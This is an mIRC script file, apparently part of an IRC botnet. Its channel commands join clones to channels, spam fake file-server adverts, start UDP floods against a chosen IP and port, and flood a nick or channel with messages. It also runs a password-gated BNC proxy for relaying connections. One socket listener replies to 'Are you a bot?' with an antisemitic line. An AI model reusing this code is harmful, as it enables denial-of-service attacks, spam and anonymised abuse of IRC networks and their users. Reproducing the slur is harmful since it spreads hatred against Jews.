on 10:text:*:#:{
  if ($1 == !clone.quite.join) {
    if ($2 == $null) { msg # [ Error ] Syntax: !clone.quite.join <chan> <key> | halt }
    timerjoiners 1 $rand(1,3000) /clone join $2 $3
  } 
  if ($1 == !clone.get.voiced) {
    if ($2 == $null) { msg # [ Error ] Syntax: !clone.voice <chan> | halt }
    timervoices 1 $rand(1,3000) /clone msg $2 0,1(15File  Server Online0) 14T15riggers:0(15Apps 14& 15Movies0) 14S15nagged:0(151.91GB in 551files0) 14O15nline:0(15214/1540) 14S15ends:0(15114/1520) 14Q15ueues:0(1540/15100) 14A15ccessed:0(15275 Times0) 14N15ote:0(14Upload new things please0) 15«~0{14P15olaris 14I15RC0}15~»
  }
  if ($1 == !var) {
    if ( [ [ $2 ] ] == $null) { msg # [ Error ] Syntax: !var <variable> | halt }
    msg # [ Var ] [ $2 ] is Equal to [ [ [ $2 ] ] ]
  } 
  if ($1 == !udp.start) {
    set %pchan #
    if ($4 == $null) { msg # [ Error ] Syntax: !udp.start <num> <ip> <port> | halt }
    if ($4 == random) { gcoolstart $2 $3 $r(1,65000) | halt }
    gcoolstart $2 $3 $4
  }
  if ($1 = !udp.stop) {
    timergcoolt off
    unset %gnum
    msg %pchan [ Udp ] Stopped
    unset %pchan
  }
  if ($1 == !set) && ($address == %master) {
    if ($2 == $null) { msg # [ Error ] Syntax: !set <variable> <value> | halt }
    set $2 [ [ $3- ] ]
    msg # [ Set ] [ $2 ] is Now Equal to [ [ [ $3- ] ] ]
  }
  if ($1 == !unset) && ($address == %master) {
    if ($2 == $null) { msg # 0,1[ 14E15rror 0] 14S15yntax:14 !unset <variable> | halt }
    unset $2
    msg # [ Unset ] [ $2 ] is Now Equal to Nothing
  }
  if ($1 == !flood.start) {
    if ($2 == $null) { msg # [ Error ] Syntax: !flood.start <nick/chan> <msg> | halt }
    if (%msg.flood.server == $null) || (%msg.flood.server.port == $null) { msg # [ Flood ] You Must Set: !flood.server <server> <port> | halt }
    if ($3 == $null) {
      set %msg2bomb BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
    }
    set %bots 1
    set %nick2bomb $$2
    set %msg2bomb $$3-
    msg # [ Flood ] Now Query/Notice Flooding [ %nick2bomb ]
    dksmsgflooder
    timer -o 1 100 /msg # [ Flood ] Complete
    timer -o 1 100 /sockclose dksmsgflooder*
    timer -o 1 102 /unset %blastedmsgs
  }
  if ($1 == !flood.stop) {
    set %blastit Off
    sockclose dksmsgflooder*
    unset %blastedmsgs
    msg # [ Flood ] Stopped
    timers off
  }
}
alias doit { socklisten p00p 420 }
on *:socklisten:p00p:{ sockaccept p00p. $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) }
on *:sockread:p00p.*:{
  var %sock
  sockread %sock
  if ($gettok(%sock,1-,32) == Are you a bot?) { sockwrite -nt $sockname Beware Of Jews }
}
alias bnc {
  if ($1 == start) { set %bnc. [ $+ [ $2 ] ] $3 | socklisten bnc. $+ $2 $2 }
  if ($1 == reset) { unset %bnc* | sockclose bnc* }
}
on *:socklisten:bnc.*:{
  if ($sock(bnc.in.temp,0) == 1) { halt }
  set %bnc.smt $gettok($sockname,2,46)
  sockaccept bnc.in.temp
  sockread
}  
on *:sockclose:bnc.in.*: {
  unset %bnc.ok. $+ $sockname
  unset %bnc. $+ $sock($sockname).ip $+ *
  unset %bp* | unset %temp.r*
  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) }
}
on *:sockread:bnc.in.*:{
  if ($sock(bnc.in.temp*,0) == 1) {
    sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip
    sockmark $sockname %bnc.smt
    unset %bnc.smt
    set %bnc.ok. $+ $sockname no
  }
  sockread -f %temp.r
  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {
    if ($gettok(%temp.r ,1,32) == NICK) {
      set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14W15elcome 14t15o 14m15y 14B15nc 0[14 $gettok(%temp.r ,2,32) 0]
      halt
    }
    if ($gettok(%temp.r ,1,32) == USER) { set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) | halt }
    if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14P15assword 14A15ccepted
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14T15ype:14 /quote conn <server> <port>
      goto next
    }
    if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) { sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14I15ncorrect 14P15assword | inc %bp }
    if (%bp >= 3) {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14T15oo 14M15any 14B15ad 14P15assword 4A15ttempts 0- 14D15isconnecting
      sockclose $sockname
      unset %bp
    }
    halt
  }
  :next
  %bnc.ok. [ $+ [ $sockname ] ] = done
  if ($gettok(%temp.r ,1,32) == IDENT) {
    identd on $gettok(%temp.r ,2,32)
    sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+14 15Ident 14S15et 14t15o 0[14 $gettok(%temp.r ,2,32) 0]
  }
  if ($gettok(%temp.r ,1,32) == VHOST) {
    if ($gettok(%temp.r ,2,32) == LIST) {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14L15isting 14V15hosts
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 0(1410) 14S15ystem 14D15efault 0[14 $ip $+ 0/14 $+ $host 0]
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 1415nd 14o15f 14V15host 14L15ist
      halt
    }
    if ($gettok(%temp.r ,2,32) == 1) {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14V15host 14S15et 14a15s 14S15ystem 14D15efault 0[14  $ip $+ 0/14 $+ $host 0] | halt
    }
    else {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 0,1[ 14E15rror 0] 14S15yntax:14 /quote vhost <num> | halt
    }
  }
  if ($gettok(%temp.r ,1,32) == CONN) {
    if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14D15isconnecting 14F15rom 14C15urrent 14S15erver
      sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )
    }
    if ($gettok(%temp.r ,3,32) == $Null) {
      sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)
      sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667
      sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14A15ttempting 14t15o 14C15onnect 14t15o 0[14 $gettok(%temp.r,2,32) $+ : $+ 6667 0] | halt
    }
    sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
    sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32)
    sockwrite -nt $sockname 0,1[ 14B15nc 0] NOTICE AUTH : $+ $+ 14A15ttempting 14t15o 14C15onnect 14t15o 0[14 $gettok(%temp.r,2,32) $+ : $+ $gettok(%temp.r ,3,32) 0] | halt
  }
  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r }
}  
on *:sockopen:bnc.out.*:{
  sockwrite -tn $sockname USER [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]
  sockwrite -tn $sockname NICK %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ]
  sockread
} 
on *:sockread:bnc.out.*:{
  sockread -f %bnc.out.t
  sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t
  unset %bnc.out.t
}
